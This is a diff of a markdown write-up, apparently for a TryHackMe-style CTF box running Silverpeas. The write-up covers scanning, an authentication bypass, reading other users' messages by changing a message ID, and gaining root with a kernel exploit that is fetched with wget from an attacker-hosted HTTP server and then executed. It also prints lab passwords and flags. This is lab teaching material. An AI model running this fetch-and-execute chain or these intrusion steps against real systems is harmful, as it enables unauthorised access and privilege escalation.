@@ -6,9 +6,8 @@
 
 We start with a standard service scan.
 
-Bash
 
-```
+```BASH
 sudo nmap -sV -sS 10.114.146.144
 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 09:06 EDT
@@ -27,9 +26,8 @@ Three ports are open. The main point of interest is port 8080, although I didn't
 
 Next, we run Nuclei to search for known vulnerabilities.
 
-Bash
 
-```
+```BASH
 nuclei -u 10.114.146.144 -severity low,medium,high,critical -o nuclei_results.txt
 
 [CVE-2023-48795] [javascript] [medium] 10.114.146.144:22 ["Vulnerable to Terrapin"]
@@ -42,7 +40,6 @@ The only vulnerability detected is Terrapin (CVE-2023-48795) on SSH. It is not p
 
 I attempted to brute-force SSH using Metasploit.
 
-Bash
 
 ```
 # Module: auxiliary/scanner/ssh/ssh_login
@@ -60,9 +57,7 @@ The brute-force attempt was unsuccessful. I then remembered the open port 8080.
 
 We run Gobuster against port 8080 to discover hidden directories.
 
-Bash
-
-```
+```BASH
 gobuster dir -u 10.112.155.196:8080 -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt
 
 /console              (Status: 302) [Size: 0] [--> /noredirect.html]
@@ -84,9 +79,7 @@ At this point, I realized that port 8080 had something much more interesting run
 
 We run Gobuster against the Silverpeas directory.
 
-Bash
-
-```
+```BASH
 gobuster dir -u http://10.112.155.196:8080/silverpeas -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt
 ```
 
@@ -134,9 +127,8 @@ We have successfully logged in as `scr1ptkiddy` without providing a password.
 
 Inside the messaging module (Silvermail), we modify the message ID in the request to `6`.
 
-http
 
-```
+```HTTP
 GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6 HTTP/1.1
 ```
 
@@ -155,27 +147,23 @@ We have obtained the SSH credentials for the user `tim`.
 
 We use the credentials to connect to the machine via SSH.
 
-Bash
 
-```
+```BASH
 ssh tim@10.xxx.xxx.xxx
 # Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 ```
 
 After logging in, we retrieve the user flag.
 
-Bash
-
-```
+```BASH
 cat user.txt
 THM{c4ca4238a0b923820dcc509a6f75849b}
 ```
 
 Next, we check our current privileges.
 
-Bash
 
-```
+```BASH
 id
 uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ```
@@ -186,18 +174,14 @@ The `tim` user is a member of the `adm` group, which grants access to certain sy
 
 First, we check the account of another user, `tyler`.
 
-Bash
-
-```
+```BASH
 grep tyler /etc/passwd
 tyler:x:1000:1000:root:/home/tyler:/bin/bash
 ```
 
 We also inspect the groups:
 
-Bash
-
-```
+```BASH
 # Groups
 adm:x:4:syslog,tyler,tim,ubuntu
 sudo:x:27:tyler,ubuntu
@@ -231,9 +215,8 @@ This confirms that Silverpeas is running inside a Docker container.
 
 We also search for SUID binaries.
 
-Bash
 
-```
+```BASH
 find / -perm -4000 -type f 2>/dev/null
 ```
 
@@ -270,26 +253,22 @@ The exploit is available here:
 
 On the attacking machine, we start a temporary HTTP server.
 
-Bash
 
-```
+```BASH
 sudo python3 -m http.server 80
 ```
 
 On the target machine, we download and execute the exploit.
 
-Bash
 
-```
+```BASH
 tim@ip-10-113-135-146:/tmp$ wget http://192.168.154.82/copy_fail_exp.py
 python3 copy_fail_exp.py
 ```
 
 After successful execution, we check our privileges.
 
-Bash
-
-```
+```BASH
 # id
 uid=0(root) gid=1001(tim) groups=1001(tim),4(adm)
 ```
@@ -298,9 +277,8 @@ We now have root privileges.
 
 Next, we navigate to `/root` and retrieve the root flag.
 
-Bash
 
-```
+```BASH
 cat /root/root.txt
 THM{098f6bcd4621d373cade4e832627b4f6}
 ```
@@ -335,35 +313,6 @@ More details and the exploit code:
 
 * [Copy Fail Exploit — GitHub](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py) 
 
-## Final Flags
-
-|
-Flag
-
-|
-
-Value
-
-|
-| --- | --- |
-|
-
-`user.txt`
-
-|
-
-`THM{c4ca4238a0b923820dcc509a6f75849b}`
-
-|
-|
-
-`root.txt`
-
-|
-
-`THM{098f6bcd4621d373cade4e832627b4f6}`
-
-|
 
 ## Exploitation Chain
 
@@ -378,10 +327,7 @@ POSTGRES_PASSWORD=_Zd_zx7N823/
 ```
 
 With this password, we could switch to the `tyler` account using:
-
-Bash
-
-```
+```BASH
 su tyler
 ```
 
